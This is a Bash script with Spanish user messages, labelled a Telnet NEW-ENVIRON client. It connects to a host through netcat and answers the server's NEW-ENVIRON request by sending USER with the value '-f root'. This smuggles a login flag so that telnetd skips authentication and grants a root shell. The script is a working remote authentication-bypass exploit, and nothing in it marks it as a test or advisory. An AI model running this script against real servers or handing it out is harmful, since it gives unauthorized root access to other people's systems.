#!/usr/bin/env bash

# ===============================
# Telnet NEW-ENVIRON Bash Client
# ===============================

HOST="$1"
PORT="${2:-23}"

if [[ -z "$HOST" ]]; then
  echo "Uso: $0 <host> [puerto]"
  exit 1
fi

# ---- Telnet constants (decimal) ----
IAC=255
DONT=254
DO=253
WONT=252
WILL=251
SB=250
SE=240

NEW_ENVIRON=39
IS=0
VAR=0
VALUE=1

USER_PAYLOAD="-f root"

# ---- Start TCP connection ----
coproc TELNET { nc "$HOST" "$PORT"; }

exec 3>&"${TELNET[1]}"   # write
exec 4<&"${TELNET[0]}"   # read

echo "[*] Conectado a $HOST:$PORT"
echo "[*] Sesión interactiva iniciada (Ctrl+C para salir)"
echo

# ---- Send helper ----
send_bytes() {
  printf "%b" "$1" >&3
}

# ---- Handle NEW-ENVIRON SB ----
send_new_environ() {
  send_bytes "\xFF\xFA\x27\x00\x00USER\x01${USER_PAYLOAD}\xFF\xF0"
}

# ---- Reader loop ----
reader() {
  while IFS= read -r -n1 byte <&4; do
    b=$(printf "%d" "'$byte")

    if [[ $b -eq $IAC ]]; then
      read -r -n1 cmd <&4
      c=$(printf "%d" "'$cmd")

      case $c in
        $DO)
          read -r -n1 opt <&4
          o=$(printf "%d" "'$opt")
          if [[ $o -eq $NEW_ENVIRON ]]; then
            send_bytes "\xFF\xFB\x27"   # WILL NEW_ENVIRON
          else
            send_bytes "\xFF\xFC$(printf '\\x%02x' $o)"
          fi
          ;;
        $WILL)
          read -r -n1 opt <&4
          o=$(printf "%d" "'$opt")
          send_bytes "\xFF\xFD$(printf '\\x%02x' $o)"
          ;;
        $SB)
          # Read until IAC SE
          buf=""
          while true; do
            read -r -n1 x <&4
            [[ $(printf "%d" "'$x") -eq $IAC ]] || continue
            read -r -n1 y <&4
            [[ $(printf "%d" "'$y") -eq $SE ]] && break
          done
          send_new_environ
          ;;
      esac
    else
      printf "%s" "$byte"
    fi
  done
}

# ---- Start reader in background ----
reader &

# ---- Keyboard → socket ----
while IFS= read -r -n1 key; do
  printf "%s" "$key" >&3
done
